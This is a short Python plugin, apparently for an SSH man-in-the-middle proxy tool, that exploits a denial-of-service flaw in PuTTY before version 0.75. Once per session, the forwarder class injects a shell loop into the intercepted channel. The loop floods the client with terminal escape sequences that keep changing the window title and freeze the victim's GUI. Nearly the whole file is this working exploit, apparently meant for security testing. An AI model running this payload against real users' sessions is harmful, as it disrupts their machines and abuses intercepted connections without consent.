from ssh_proxy_server.forwarders.ssh import SSHForwarder


class SSHPuttyDoSForwarder(SSHForwarder):
    """PuTTY < 0.75: DoS on Windows/Linux clients

    Security fix: a server could DoS the whole Windows/Linux GUI by telling
    the PuTTY window to change its title repeatedly at high speed.

    PuTTY-Changelog: https://www.chiark.greenend.org.uk/~sgtatham/putty/changes.html
    """

    def __init__(self, session):
        super().__init__(session)
        self.exploit = [
            "PS1=''",
            "while :",
            "do",
            "echo -ne '\\033]0: NEW_TITLE${RANDOM} \\007'",
            "done"
        ]
        self.executed = False

    def forward_extra(self):
        if not self.executed:
            self.server_channel.sendall('\n'.join(self.exploit) + '\n')
            self.executed = True
